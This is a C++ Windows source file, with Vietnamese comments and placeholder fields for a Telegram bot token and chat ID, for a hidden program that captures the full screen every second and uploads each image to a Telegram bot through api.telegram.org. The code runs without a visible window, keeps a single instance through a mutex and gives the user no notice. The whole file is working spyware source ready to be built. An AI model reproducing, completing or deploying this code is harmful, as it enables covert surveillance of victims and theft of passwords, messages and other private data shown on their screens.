#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <vector>
#include <string>  
#include <wininet.h>
#include <process.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace Gdiplus;

const std::string BOT_TOKEN = "Nhập Token bot tele của bạn";
const std::string CHAT_ID = "ID chat bot tele của bạn";

void SendPhoto(const std::vector<BYTE>& buffer) {
    HINTERNET hS = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hC = InternetConnectA(hS, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hC) {
        std::string url = "/bot" + BOT_TOKEN + "/sendPhoto";
        HINTERNET hR = HttpOpenRequestA(hC, "POST", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
        std::string b = "----B123";
        std::string h = "Content-Type: multipart/form-data; boundary=" + b;
        std::string s = "--" + b + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n--" + b + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"s.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n";
        std::string e = "\r\n--" + b + "--\r\n";
        std::vector<BYTE> body(s.begin(), s.end());
        body.insert(body.end(), buffer.begin(), buffer.end());
        body.insert(body.end(), e.begin(), e.end());
        HttpSendRequestA(hR, h.c_str(), (DWORD)-1, (LPVOID)body.data(), (DWORD)body.size());
        InternetCloseHandle(hR); InternetCloseHandle(hC);
    }
    InternetCloseHandle(hS);
}

void __cdecl ScreenThread(void* p) {
    while (true) {
        IStream* is = NULL; CreateStreamOnHGlobal(NULL, TRUE, &is);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hS = GetDC(NULL), hM = CreateCompatibleDC(hS);
        HBITMAP hB = CreateCompatibleBitmap(hS, w, h); SelectObject(hM, hB);
        BitBlt(hM, 0, 0, w, h, hS, 0, 0, SRCCOPY);
        CLSID c; CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &c);
        Bitmap bmp(hB, (HPALETTE)0); bmp.Save(is, &c, NULL);
        STATSTG st; is->Stat(&st, STATFLAG_DEFAULT);
        std::vector<BYTE> f(st.cbSize.LowPart);
        LARGE_INTEGER z = {0}; is->Seek(z, STREAM_SEEK_SET, NULL);
        is->Read(&f[0], st.cbSize.LowPart, NULL);
        SendPhoto(f);
        is->Release(); DeleteObject(hB); DeleteDC(hM); ReleaseDC(NULL, hS);
        Sleep(1000); // Tốc độ vàng 1s/ảnh
    }
}

int APIENTRY WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS) {
    HANDLE m = CreateMutexA(NULL, TRUE, "Global\\QuickMonitor_Unique");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    GdiplusStartupInput gS; ULONG_PTR gT; GdiplusStartup(&gT, &gS, NULL);
    
    _beginthread(ScreenThread, 0, NULL);

    while (true) Sleep(10000);
    return 0;
}